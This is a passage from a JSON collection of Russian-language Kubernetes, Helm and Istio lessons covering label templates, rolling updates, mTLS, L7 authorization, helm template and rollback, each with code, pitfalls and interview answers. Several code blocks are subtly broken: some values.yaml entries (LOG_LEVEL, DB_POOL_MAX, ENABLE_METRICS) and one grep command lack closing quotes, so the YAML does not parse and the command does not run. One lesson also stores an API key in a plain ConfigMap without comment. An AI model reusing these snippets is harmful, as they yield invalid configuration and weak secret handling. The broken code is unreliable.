    "step_by_step": "1. Создайте в `_helpers.tpl` именованный шаблон `myapp.labels`.\n2. В `templates/configmap.yaml` используйте цикл `range` для динамической генерации ключей и значений.\n3. Добавьте проверку `required` для критического параметра конфигурации.\n4. Примените функцию `include` с фильтром `nindent 4` для подстановки стандартных меток.\n5. Проверьте результат рендеринга через `helm template`.",
    "code_blocks": [
      {
        "filename": "templates/_helpers.tpl",
        "lang": "yaml",
        "code": "{{/*\nСтандартный набор лейблов Kubernetes\n*/}}\n{{- define \"myapp.labels\" -}}\nhelm.sh/chart: {{ printf \"%s-%s\" .Chart.Name .Chart.Version | replace \"+\" \"_\" | trunc 63 | trimSuffix \"-\" }}\napp.kubernetes.io/name: {{ .Chart.Name }}\napp.kubernetes.io/instance: {{ .Release.Name }}\napp.kubernetes.io/version: {{ .Chart.AppVersion | quote }}\napp.kubernetes.io/managed-by: {{ .Release.Service }}\n{{- end }}"
      },
      {
        "filename": "templates/configmap.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: {{ .Release.Name }}-config\n  labels:\n    {{- include \"myapp.labels\" . | nindent 4 }}\ndata:\n  APP_ENV: {{ .Values.environment | default \"production\" | quote }}\n  API_KEY: {{ required \"Параметр apiKey строго обязателен для запуска!\" .Values.apiKey | quote }}\n  {{- range $key, $value := .Values.extraEnv }}\n  {{ $key }}: {{ $value | quote }}\n  {{- end }}"
      },
      {
        "filename": "values.yaml",
        "lang": "yaml",
        "code": "environment: \"staging\"\napiKey: \"AIzaSyD-SecretApiKeyExample123\"\n\nextraEnv:\n  FEATURE_ANALYTICS: \"true\"\n  CACHE_TTL_SECONDS: \"3600\"\n  LOG_LEVEL: \"debug"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Рендеринг ConfigMap с проверкой отступов и работы include\nhelm template my-release ./myapp -s templates/configmap.yaml\n\n# Проверка реакции на отсутствие обязательного параметра\nhelm template my-release ./myapp --set apiKey=\"\"\n# Error: execution error at (myapp/templates/configmap.yaml:10:13): Параметр apiKey строго обязателен для запуска!"
      }
    ],
    "under_the_hood": "Директива `include` реализована в Helm как вызов внутренней Go-функции, которая выполняет вызов шаблонизатора для именованного фрагмента и возвращает результирующую строку. Это отличает её от встроенного ключевого слова Go `template`, которое пишет результат напрямую в `io.Writer` и потому не может комбинироваться с оператором пайплайна `|` (`nindent`, `indent`, `upper`).",
    "pitfalls": "1. Забытый контекст (точка `.`) при вызове: `{{ include \"myapp.labels\" }}` без точки в конце приведет к панике `nil pointer evaluating interface {}`, так как шаблон не получит доступ к глобальным объектам `.Values` и `.Chart`.\n2. Потеря отступов при генерации меток: вызов `{{ include \"myapp.labels\" . }}` без фильтра `| nindent 4` вставит первую строку с 4 пробелами, а все последующие прижмет к левому краю, разрушив YAML-структуру.",
    "bigtech_interview": "**Вопрос с собеседования:** «Чем отличается поведение `{{ template \"name\" . }}` от `{{ include \"name\" . }}` в Helm-шаблонах и почему в production-чартах почти всегда используют `include`?»\n**Ответ:** `template` — это стандартная инструкция Go `text/template`, которая не является функцией и не возвращает значение, поэтому её вывод нельзя передать по пайплайну в функции форматирования (`| nindent 4` или `| b64enc`). `include` — это вспомогательная функция Helm, которая возвращает отрендеренную строку, что позволяет передавать её в любые трансформаторы текста. Без `include` невозможно корректно вставить блок общих labels с нужным уровнем отступа."
  },
  {
    "num": 101,
    "title": "Обновление версии без даунтайма: Rolling Update и стратегия Rollout",
    "task": "**Обновление версии (Rollout)**: Внеси изменение в код (например, поменяй текст ответа HTTP сервера). Собери и запушь образ с новым тегом (`v1.1.0`). Измени тег в `deployment.yaml` и сделай `kubectl apply`. K8s сделает *Rolling Update*: будет аккуратно гасить старые поды и поднимать новые без даунтайма (Zero Downtime).",
    "theory": "Стратегия **RollingUpdate** — механизм обновления в Kubernetes по умолчанию:\n1. **Принцип работы:** Вместо одновременной остановки всех экземпляров приложения (стратегия `Recreate`), контроллер Deployment постепенно заменяет старые поды на новые.\n2. **Параметры управления скоростью и емкостью:**\n   - `maxSurge`: максимальное количество дополнительных Pod'ов сверх желаемого `replicas` во время обновления (число или процент, например `25%` или `1`).\n   - `maxUnavailable`: максимальное количество недоступных Pod'ов во время процесса обновления (например, `0` или `25%`).\n3. **Формула Zero Downtime:**\n   Комбинация `maxUnavailable: 0` и `maxSurge: 1` (или `25%`) гарантирует, что кластер ВСЕГДА держит 100% требуемой емкости: сначала поднимается новый Pod, проходит readiness probe, становится `Ready`, включается в балансировку Service, и только затем старый Pod удаляется через graceful shutdown.",
    "step_by_step": "1. Создайте первую версию Go-сервера `v1.0.0` и задеплойте ее через `deployment.yaml`.\n2. Измените код Go-сервера на версию `v1.1.0` и пересоберите Docker-образ.\n3. В `deployment.yaml` настройте параметры `rollingUpdate: maxSurge: 1, maxUnavailable: 0`.\n4. Обновите образ: `kubectl set image deployment/web-server web=my-registry.io/web-server:v1.1.0`.\n5. Отслеживайте плавное замещение подов командой `kubectl rollout status deployment/web-server`.",
    "code_blocks": [
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-server\n  namespace: default\nspec:\n  replicas: 4\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxSurge: 1\n      maxUnavailable: 0\n  selector:\n    matchLabels:\n      app: web-server\n  template:\n    metadata:\n      labels:\n        app: web-server\n    spec:\n      containers:\n        - name: web\n          image: my-registry.io/web-server:v1.1.0\n          ports:\n            - containerPort: 8080\n          readinessProbe:\n            httpGet:\n              path: /healthz\n              port: 8080\n            initialDelaySeconds: 3\n            periodSeconds: 2"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\nconst AppVersion = \"v1.1.0\"\n\nfunc main() {\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Ответ от сервера. Текущая версия: %s\\n\", AppVersion)\n\t})\n\n\thttp.HandleFunc(\"/healthz\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\t_, _ = w.Write([]byte(\"OK\"))\n\t})\n\n\tlog.Printf(\"Сервер версии %s запущен на :8080\", AppVersion)\n\tif err := http.ListenAndServe(\":8080\", nil); err != nil {\n\t\tlog.Fatalf(\"Ошибка: %v\", err)\n\t}\n}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Запуск мониторинга статуса выкатки новой версии\nkubectl rollout status deployment/web-server\n\n# Просмотр истории релизов\nkubectl rollout history deployment/web-server\n\n# Проверка того, что ни один запрос не завершился ошибкой во время выкатки\nwhile true; do curl -s http://web-service/ | grep \"Версия\"; sleep 0.2; done"
      }
    ],
    "under_the_hood": "Deployment управляет не подами напрямую, а объектами **ReplicaSet**. При обновлении шаблона спецификации пода (`template`) Deployment создает НОВЫЙ ReplicaSet для версии `v1.1.0`. `deployment-controller` увеличивает `replicas` нового ReplicaSet (до 1 при `maxSurge: 1`), ждет, пока Pod пройдет Readiness Probe, затем уменьшает `replicas` старого ReplicaSet с 4 до 3. Этот цикл повторяется, пока старый ReplicaSet не опустится до 0 реплик, а новый не достигнет 4.",
    "pitfalls": "1. Использование тега `latest`: если в манифесте указан `image: app:latest`, то при повторном `kubectl apply` хеш спецификации Pod не меняется, и контроллер вообще не инициирует Rolling Update! Всегда используйте уникальные версионные теги (`v1.1.0` или git commit sha).\n2. Отсутствие Readiness Probe: K8s посчитает новый Pod готовым сразу после старта процесса (TCP сокет еще не слушает, кэши не загружены), переведет трафик на него и удалит старый рабочий Pod, что вызовет лавину 502/503 ошибок.",
    "bigtech_interview": "**Вопрос с собеседования:** «Что произойдет, если в ходе Rolling Update новый Pod падает с ошибкой `CrashLoopBackOff`?»\n**Ответ:** Процесс обновления автоматически замораживается. Контроллер не сможет перевести новый Pod в состояние `Ready`, поэтому не станет масштабировать новый ReplicaSet дальше и не будет удалять оставшиеся старые поды. Благодаря параметру `maxUnavailable: 0` старые поды продолжают полноценно обслуживать 100% пользовательского трафика без даунтайма."
  },
  {
    "num": 102,
    "title": "Шаблонизация манифестов: параметризация реплик, образов и окружения",
    "task": "**[Templating]**: Параметризуй количество реплик, образ и переменные окружения в `deployment.yaml` с помощью Go-шаблонов (`.Values.replicaCount`).",
    "theory": "Шаблонизация в Helm базируется на текстовой интерполяции с использованием контекстного объекта (`.`):\n1. **Корневой контекст (`.`):**\n   - `.Values` — доступ к иерархии значений из `values.yaml`.\n   - `.Chart` — метаданные чарта.\n   - `.Release` — метаданные релиза (имя, namespace).\n2. **Параметризация ключевых блоков Deployment:**\n   - Масштабирование: `replicas: {{ .Values.replicaCount }}`.\n   - Контейнерный образ: `image: \"{{ .Values.image.repository }}:{{ .Values.image.tag | default .Chart.AppVersion }}\"`.\n   - Переменные окружения: генерация списка `env` через цикл `range` со строгим форматированием отступов.\n3. **Принцип DRY (Don't Repeat Yourself):** Один универсальный шаблон `deployment.yaml` обслуживает как тестовые стенды (1 реплика, минимальные ресурсы), так и нагруженные продакшен-кластеры.",
    "step_by_step": "1. Создайте файл `values.yaml` со структурированными полями `replicaCount`, `image` и картой переменных `envVars`.\n2. Напишите `templates/deployment.yaml` с использованием шаблонизации Go.\n3. Примените функцию `quote` для безопасного экранирования строковых значений.\n4. Проверьте сгенерированный манифест с помощью `helm template test-rel ./my-chart`.",
    "code_blocks": [
      {
        "filename": "values.yaml",
        "lang": "yaml",
        "code": "replicaCount: 3\n\nimage:\n  repository: docker.io/mycorp/payment-service\n  tag: \"2.4.1\"\n  pullPolicy: IfNotPresent\n\nenvVars:\n  ENVIRONMENT: \"production\"\n  LOG_FORMAT: \"json\"\n  HTTP_PORT: \"8080\"\n  ENABLE_METRICS: \"true"
      },
      {
        "filename": "templates/deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ .Release.Name }}-payment\n  labels:\n    app.kubernetes.io/name: payment\n    app.kubernetes.io/instance: {{ .Release.Name }}\nspec:\n  replicas: {{ .Values.replicaCount }}\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: payment\n      app.kubernetes.io/instance: {{ .Release.Name }}\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: payment\n        app.kubernetes.io/instance: {{ .Release.Name }}\n    spec:\n      containers:\n        - name: payment\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag | default .Chart.AppVersion }}\"\n          imagePullPolicy: {{ .Values.image.pullPolicy }}\n          ports:\n            - containerPort: 8080\n          env:\n            {{- range $key, $val := .Values.envVars }}\n            - name: {{ $key }}\n              value: {{ $val | quote }}\n            {{- end }}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Рендеринг манифеста с проверкой подстановки переменных окружения\nhelm template payment-release ./my-chart\n\n# Переопределение количества реплик на лету без изменения values.yaml\nhelm template payment-release ./my-chart --set replicaCount=10 | grep \"replicas:"
      }
    ],
    "under_the_hood": "Во время вызова `helm template` Go-рантайм компилирует AST-дерево шаблона. Переменные `$key` и `$val` связываются с элементами карты `envVars`. Фильтр `| quote` вызывает функцию библиотеки Sprig, которая сериализует значение в экранированную строку в двойных кавычках (`\"production\"`), предотвращая некорректную трактовку YAML-парсером булевых значений или чисел как строковых типов.",
    "pitfalls": "1. Забытый фильтр `quote` для строковых переменных со спецсимволами: если в переменной передается строка вида `\"true\"`, `\"12345\"` или `\"yes\"`, YAML-парсер без кавычек интерпретирует их как boolean или int, вызвав ошибку схемы K8s `wrong type for value: expected string, got bool`.\n2. Потеря отступа при использовании `range`: директива `{{- range` обязана иметь дефис слева для удаления пустой строки, иначе в манифесте появится пустое пространство перед первым элементом списка.",
    "bigtech_interview": "**Вопрос с собеседования:** «Как в шаблоне Helm безопасно подставить значение переменной, если оно может отсутствовать в `values.yaml`?»\n**Ответ:** Для этого используют фильтр `default`: `{{ .Values.database.port | default 5432 }}`. Если ключ `database.port` не определен или пуст, шаблонизатор подставит значение `5432`. Если же параметр строго обязателен для работы сервиса, применяют функцию `required`: `{{ required \"database.password must be set!\" .Values.database.password }}`."
  },
  {
    "num": 103,
    "title": "Istio Zero-Trust Network: взаимный TLS (mTLS) и PeerAuthentication",
    "task": "Настрой **Istio mTLS**: `PeerAuthentication` with `mtls: mode: STRICT`. All service-to-service communication encrypted and authenticated. `DestinationRule` with `trafficPolicy: tls: mode: ISTIO_MUTUAL`. Покажи zero-trust network.",
    "theory": "Концепция **Zero Trust Architecture** гласит: «Никому не доверяй, всегда проверяй». Внутренняя сеть кластера считается потенциально враждебной.\n**Реализация mTLS в Istio:**\n1. **Шифрование и аутентификация:** При каждом TCP-соединении между подами прокси-серверы Envoy выполняют взаимный TLS-хэндшейк (Mutual TLS). И клиент, и сервер предъявляют X.509-сертификаты.\n2. **Идентификация SPIFFE:** Сертификат содержит SAN (Subject Alternative Name) формата `spiffe://cluster.local/ns/<namespace>/sa/<serviceaccount>`.\n3. **Режимы `PeerAuthentication`:**\n   - `PERMISSIVE` (по умолчанию) — принимает как зашифрованный mTLS трафик, так и обычный открытый HTTP/TCP (удобно для плавной миграции).\n   - `STRICT` — требует ИСКЛЮЧИТЕЛЬНО mTLS. Любой запрос без валидного клиентского сертификата от Envoy немедленно сбрасывается.\n   - `DISABLE` — mTLS отключен.\n4. **`DestinationRule`:** на стороне клиента указывает Envoy отправлять трафик строго в режиме `ISTIO_MUTUAL`.",
    "step_by_step": "1. Создайте манифест `PeerAuthentication` в режиме `STRICT` для namespace `secure-zone`.\n2. Создайте `DestinationRule` с политикой `ISTIO_MUTUAL`.\n3. Задеплойте два микросервиса (клиент и сервер) с автоматической инъекцией Envoy.\n4. Проверьте через `istioctl authn tls-check`, что между подами включен mTLS.\n5. Отправьте запрос из обычного пода без sidecar: запрос должен быть отклонен.",
    "code_blocks": [
      {
        "filename": "peer-auth.yaml",
        "lang": "yaml",
        "code": "apiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: default-strict-mtls\n  namespace: secure-zone\nspec:\n  mtls:\n    mode: STRICT"
      },
      {
        "filename": "destination-rule.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.istio.io/v1alpha3\nkind: DestinationRule\nmetadata:\n  name: internal-mtls\n  namespace: secure-zone\nspec:\n  host: \"*.secure-zone.svc.cluster.local\"\n  trafficPolicy:\n    tls:\n      mode: ISTIO_MUTUAL"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Применение строгой политики Zero-Trust mTLS\nkubectl apply -f peer-auth.yaml\nkubectl apply -f destination-rule.yaml\n\n# Проверка статуса mTLS шифрования между сервисами\nistioctl proxy-config endpoint app-client-pod.secure-zone | grep \"app-server\"\n\n# Попытка запроса из пода без Envoy sidecar вернет ошибку разрыва соединения\nkubectl run unsecure-test --image=curlimages/curl --rm -it -- curl -k http://app-server.secure-zone:8080/\n# curl: (56) Recv failure: Connection reset by peer"
      }
    ],
    "under_the_hood": "Агент `pilot-agent`, работающий в sidecar-контейнере `istio-proxy`, генерирует приватный ключ RSA/ECDSA и запрос CSR (Certificate Signing Request). Через защищенный сокет Envoy Secret Discovery Service (SDS) запрос отправляется в `istiod` (выступающий в роли CA — Certificate Authority). `istiod` выпускает краткосрочный X.509-сертификат (по умолчанию действует 24 часа) и возвращает его в Envoy. Сертификаты автоматически ротируются в памяти каждые 12 часов без перезапуска контейнера и сброса TCP-соединений.",
    "pitfalls": "1. Включение `mode: STRICT` до внедрения Envoy во все взаимодействующие поды: поды без sidecar мгновенно потеряют связь с сервисами в данном namespace.\n2. Проблемы с Liveness/Readiness пробами K8s: Kubelet выполняет проверки с хоста без сертификата Envoy. В Istio по умолчанию включен rewrite probe (`probe rewrite`), проксирующий запросы kubelet через специальный локальный порт Envoy.",
    "bigtech_interview": "**Вопрос с собеседования:** «В чем отличие `tls: mode: MUTUAL` от `tls: mode: ISTIO_MUTUAL` в `DestinationRule`?»\n**Ответ:** `mode: MUTUAL` требует ручного указания путей к файлам клиентского сертификата, закрытого ключа и CA-сертификата (`clientCertificate`, `privateKey`, `caCertificates`). Режим `mode: ISTIO_MUTUAL` сообщает Envoy использовать встроенную инфраструктуру открытых ключей Istio (SPIFFE/SDS): ключи и сертификаты автоматически запрашиваются у `istiod`, ротируются каждые сутки и связываются с ServiceAccount пода без ручного управления секретами."
  },
  {
    "num": 104,
    "title": "Полная параметризация чарта: values.yaml, теги, лимиты и переменные",
    "task": "Параметризуйте chart через `values.yaml`: image tag, replica count, resources, env vars.",
    "theory": "Создание гибких и переиспользуемых Helm-чартов корпоративного уровня требует структурирования `values.yaml` по доменным зонам:\n1. **Группировка параметров:**\n   - `image`: репозиторий, тег, pullPolicy, pullSecrets.\n   - `replicaCount`: базовое число реплик (переопределяется HPA, если он включен).\n   - `resources`: явное объявление `requests` и `limits` (защита от Noisy Neighbor).\n   - `env`: словарь явных переменных окружения.\n   - `secrets`: безопасные ссылки на секреты кластера.\n2. **Валидация схемы через `values.schema.json`:**\n   Helm 3 поддерживает JSON Schema для валидации значений в `values.yaml` прямо во время вызова `helm install` или `helm lint` (проверка типов, обязательных полей, диапазонов чисел).",
    "step_by_step": "1. Сформируйте чистый и документированный файл `values.yaml`.\n2. Создайте файл схемы `values.schema.json` для строгой проверки типов (например, `replicaCount >= 1`).\n3. Примените параметры в манифесте `deployment.yaml`.\n4. Проверьте валидацию некорректных значений через `helm lint`.",
    "code_blocks": [
      {
        "filename": "values.yaml",
        "lang": "yaml",
        "code": "replicaCount: 2\n\nimage:\n  repository: registry.gitlab.com/fintech/auth-service\n  tag: \"1.8.0\"\n  pullPolicy: IfNotPresent\n\nresources:\n  requests:\n    cpu: 250m\n    memory: 256Mi\n  limits:\n    cpu: 1000m\n    memory: 1024Mi\n\nenv:\n  LOG_LEVEL: \"info\"\n  METRICS_ENABLED: \"true\"\n  DB_POOL_MAX: \"20"
      },
      {
        "filename": "values.schema.json",
        "lang": "json",
        "code": "{\n  \"$schema\": \"https://json-schema.org/draft-07/schema#\",\n  \"type\": \"object\",\n  \"required\": [\"replicaCount\", \"image\", \"resources\"],\n  \"properties\": {\n    \"replicaCount\": {\n      \"type\": \"integer\",\n      \"minimum\": 1,\n      \"maximum\": 50\n    },\n    \"image\": {\n      \"type\": \"object\",\n      \"required\": [\"repository\", \"tag\"],\n      \"properties\": {\n        \"repository\": { \"type\": \"string\" },\n        \"tag\": { \"type\": \"string\" }\n      }\n    }\n  }\n}"
      },
      {
        "filename": "templates/deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ .Release.Name }}-auth\nspec:\n  replicas: {{ .Values.replicaCount }}\n  selector:\n    matchLabels:\n      app: {{ .Release.Name }}-auth\n  template:\n    metadata:\n      labels:\n        app: {{ .Release.Name }}-auth\n    spec:\n      containers:\n        - name: auth\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag }}\"\n          imagePullPolicy: {{ .Values.image.pullPolicy }}\n          resources:\n            {{- toYaml .Values.resources | nindent 12 }}\n          env:\n            {{- range $k, $v := .Values.env }}\n            - name: {{ $k }}\n              value: {{ $v | quote }}\n            {{- end }}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Проверка валидации схемы при передаче недопустимого значения\nhelm lint ./my-chart --set replicaCount=0\n# [ERROR] values.schema.json: replicaCount: Must be greater than or equal to 1"
      }
    ],
    "under_the_hood": "Встроенный валидатор Helm парсит `values.schema.json` перед рендерингом Go-шаблонов. Если пользователь передает параметр с неверным типом или значением, выходящим за пределы диапазона (например, отрицательное число реплик), выполнение команды `helm install` или `helm upgrade` аварийно прерывается до отправки запроса в `kube-apiserver`.",
    "pitfalls": "1. Жесткое указание `replicaCount` при активном HPA: если HorizontalPodAutoscaler масштабирует деплоймент до 10 реплик, а затем запускается `helm upgrade` с `replicaCount: 2`, деплоймент кратковременно ужмется до 2 подов, вызвав отказ в обслуживании под нагрузкой.\n2. Отсутствие кавычек в тегах образов, содержащих только цифры: тег `tag: 1.10` парсится YAML как число с плавающей точкой `1.1`. Всегда указывайте теги как строки: `tag: \"1.10\"`.",
    "bigtech_interview": "**Вопрос с собеседования:** «Как предотвратить сброс количества реплик до значения `replicaCount` из `values.yaml` при выполнении CI/CD `helm upgrade`, если в кластере работает HPA?»\n**Ответ:** 1) В шаблоне `deployment.yaml` можно сделать проверку: `{{- if not .Values.autoscaling.enabled }} replicas: {{ .Values.replicaCount }} {{- end }}`; 2) Не указывать поле `spec.replicas` в шаблоне Deployment вовсе, передав полное управление репликами HPA; 3) Использовать `helm.sh/resource-policy: keep` или сторонние GitOps-контроллеры с игнорированием полей (`ignoreDifferences` на `spec.replicas` в ArgoCD)."
  },
  {
    "num": 105,
    "title": "Istio Authorization: L7 авторизация, ServiceAccount и валидация JWT",
    "task": "Настрой **Istio Authorization**: `AuthorizationPolicy` — allow/deny based on source (service account), operation (GET /api/users), conditions (JWT claims). Покажи L7 authorization.",
    "theory": "Шифрование mTLS обеспечивает идентификацию вызывающего сервиса (Authentication), но не определяет права доступа (Authorization).\n**Объект `AuthorizationPolicy`:**\n1. **Действие по умолчанию:**\n   - Если для рабочей нагрузки (workload) не задана ни одна политика, разрешен весь трафик.\n   - Как только создается ХОТЯ БЫ ОДНА политика `action: ALLOW`, действует принцип «запрещено всё, что явно не разрешено» (Default Deny).\n2. **Селекторы и условия:**\n   - `selector.matchLabels`: целевые поды сервиса.\n   - `rules.from.source.principals`: проверка идентичности вызывающего сервиса (SPIFFE ID или ServiceAccount, например `cluster.local/ns/default/sa/frontend-sa`).\n   - `rules.to.operation`: HTTP-методы (`GET`, `POST`), пути (`/api/v1/users/*`), порты.\n   - `rules.when`: валидация клеймов JWT-токена (например, `request.auth.claims[role] == \"admin\"`).\n3. **Безопасность на уровне L7:** Фильтрация происходит прямо внутри Envoy-прокси до того, как пакет попадет в код Go-микросервиса.",
    "step_by_step": "1. Создайте манифест `AuthorizationPolicy`, разрешающий только `GET` запросы к `/api/users` только для ServiceAccount `frontend-service-account`.\n2. Создайте правило проверки роли `admin` из JWT токена.\n3. Протестируйте отправку запроса с корректным ServiceAccount и без него.\n4. Проверьте возврат ошибки HTTP 403 Forbidden от Envoy при нарушении политик.",
    "code_blocks": [
      {
        "filename": "auth-policy.yaml",
        "lang": "yaml",
        "code": "apiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: user-service-rbac\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app: user-service\n  action: ALLOW\n  rules:\n    - from:\n        - source:\n            principals: [\"cluster.local/ns/default/sa/frontend-sa\"]\n      to:\n        - operation:\n            methods: [\"GET\"]\n            paths: [\"/api/users\", \"/api/users/*\"]\n    - from:\n        - source:\n            principals: [\"cluster.local/ns/default/sa/admin-portal-sa\"]\n      to:\n        - operation:\n            methods: [\"POST\", \"DELETE\"]\n            paths: [\"/api/users/*\"]\n      when:\n        - key: request.auth.claims[role]\n          values: [\"superuser\"]"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Применение политики L7 RBAC\nkubectl apply -f auth-policy.yaml\n\n# Запрос от авторизованного frontend-sa вернет HTTP 200 OK\nkubectl exec -it frontend-pod -- curl -i http://user-service:8080/api/users\n\n# Попытка выполнить POST от неавторизованного клиента вернет HTTP 403\nkubectl exec -it rogue-pod -- curl -i -X POST http://user-service:8080/api/users\n# HTTP/1.1 403 Forbidden\n# content-length: 19\n# RBAC: access denied"
      }
    ],
    "under_the_hood": "Envoy sidecar парсит TLS-сертификат входящего mTLS соединения и извлекает SAN URI SPIFFE identity вызывающего сервиса. Если настроена валидация JWT, фильтр `envoy.filters.http.jwt_authn` валидирует подпись токена по открытому ключу JWKS (JSON Web Key Set). Далее фильтр `envoy.filters.http.rbac` сопоставляет SPIFFE ID, метод HTTP, путь и клеймы с таблицей правил `AuthorizationPolicy`. При несоответствии Envoy возвращает клиенту ответ `403 Forbidden` с телом `RBAC: access denied`, даже не передавая байты в Go-приложение.",
    "pitfalls": "1. Использование `action: ALLOW` без учета health check эндпоинтов: если заблокировать все пути, kubelet не сможет выполнить `livenessProbe` по пути `/healthz`, и контейнер уйдет в бесконечный цикл перезапуска. Всегда явно разрешайте проверки здоровья.\n2. Проверка путей с учетом завершающего слеша: путь `/api/users` и `/api/users/` считаются разными путями. Используйте шаблоны с маской `paths: [\"/api/users*\"]`.",
    "bigtech_interview": "**Вопрос с собеседования:** «В чем преимущество выноса проверки прав и JWT-токенов в Istio AuthorizationPolicy по сравнению с реализацией middleware внутри Go-кода?»\n**Ответ:** 1) Унификация безопасности: единый декларативный аудит политик для всех микросервисов независимо от языка программирования (Go, Java, Python); 2) Защита от DoS-атак: невалидные или вредоносные запросы отсекаются в C++ коде Envoy на раннем этапе, не расходуя CPU, память и горутины целевого Go-приложения; 3) Мгновенное обновление прав без пересборки и деплоя бинарников микросервисов."
  },
  {
    "num": 106,
    "title": "Локальный рендеринг и отладка манифестов: команда helm template",
    "task": "Используйте `helm template` для рендера манифестов локально без установки в кластер.",
    "theory": "Команда **`helm template`** — важнейший инструмент разработчика и CI/CD конвейеров:\n1. **Назначение:** Рендерит шаблоны чарта в стандартный многодокументный YAML-файл на stdout без подключения к кластеру Kubernetes (полностью offline).\n2. **Ключевые флаги:**\n   - `-f my-values.yaml`: подстановка конкретного файла значений.\n   - `-s templates/deployment.yaml`: рендеринг только одного конкретного файла шаблона (ускоряет отладку).\n   - `--validate`: проверка соответствия сгенерированных манифестов OpenAPI-схеме целевой версии Kubernetes (требует подключения к API кластера).\n   - `--api-versions`: эмуляция поддерживаемых API версий K8s в offline-режиме.\n3. **Применение в CI/CD:**\n   - Сканирование манифестов статическими анализаторами безопасности (**kube-linter**, **checkov**, **trivy**, **polaris**).\n   - Сравнение диффов перед деплоем через `helm-diff`.",
    "step_by_step": "1. Запустите рендеринг всего чарта: `helm template my-release ./my-chart`.\n2. Запустите рендеринг только сервиса: `helm template my-release ./my-chart -s templates/service.yaml`.\n3. Передайте сгенерированный поток манифестов в линтер безопасности `kube-linter`.\n4. Протестируйте dry-run проверку через `kubectl apply --dry-run=client -f -`.",
    "code_blocks": [
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Рендеринг всех манифестов чарта в один файл\nhelm template webapp ./myapp-chart -f values-prod.yaml > release.yaml\n\n# Рендеринг строго одного шаблона для точечной отладки\nhelm template webapp ./myapp-chart -s templates/ingress.yaml\n\n# Валидация манифестов на соответствие стандартам безопасности K8s\nhelm template webapp ./myapp-chart | kube-linter lint -\n\n# Клиентская валидация синтаксиса K8s без реального создания объектов в кластере\nhelm template webapp ./myapp-chart | kubectl apply --dry-run=client -f -"
      },
      {
        "filename": "ci-validate.sh",
        "lang": "bash",
        "code": "#!/bin/bash\nset -euo pipefail\n\necho \"=== Запуск валидации Helm-шаблонов в CI ===\"\nENVIRONMENTS=(\"dev\" \"staging\" \"prod\")\n\nfor env in \"${ENVIRONMENTS[@]}\"; do\n  echo \"Проверка окружения: $env\"\n  helm template \"app-$env\" ./chart -f \"chart/values-$env.yaml\" --validate > \"/tmp/rendered-$env.yaml\"\n  kubectl apply --dry-run=server -f \"/tmp/rendered-$env.yaml\"\ndone\n\necho \"✅ Все манифесты успешно прошли валидацию API-сервером K8s!\" "
      }
    ],
    "under_the_hood": "`helm template` инициализирует локальный движок рендеринга Helm без вызова сетевых библиотек `client-go`. Он подставляет фиктивные метаданные для `.Release.IsInstall` (true), `.Release.IsUpgrade` (false) и `.Release.Revision` (1). Если используется флаг `--validate`, Helm связывается с Discovery API кластера для загрузки OpenAPI/JSON-схем и проверяет соответствие каждого типа ресурса стандарту API.",
    "pitfalls": "1. Ограничения функций `lookup`: функция `lookup`, запрашивающая существующие ресурсы в работающем кластере (например, существующий секрет), при выполнении `helm template` возвращает пустую карту `{}`. Шаблоны, полагающиеся на `lookup`, требуют условий обработки nil.\n2. Несоответствие версий API: манифест может успешно отрендериться, но упасть в кластере из-за того, что версия API (например, `batch/v1beta1`) была удалена в используемой версии Kubernetes.",
    "bigtech_interview": "**Вопрос с собеседования:** «Как в пайплайне GitLab CI / GitHub Actions организовать автоматический аудит безопасности манифестов Helm перед мерджем Pull Request?»\n**Ответ:** На этапе тестирования запускается шаг: 1) `helm lint ./chart` для проверки синтаксиса; 2) `helm template release ./chart -f values-prod.yaml > rendered.yaml`; 3) Запуск статических сканеров поверх `rendered.yaml`: `trivy config rendered.yaml` и `kube-linter lint rendered.yaml`. Это позволяет блокировать PR, если разработчик случайно объявил запуск контейнера от пользователя root, забыл указать resource limits или смонтировал опасные хостовые пути."
  },
  {
    "num": 107,
    "title": "Откат развертывания: kubectl rollout undo и ревизии ReplicaSet",
    "task": "**Откат (Rollback)**: Ты понял, что версия `v1.1.0` с багом. Выполни команду `kubectl rollout undo deployment/my-app`. Кластер автоматически вернет старую рабочую версию приложения.",
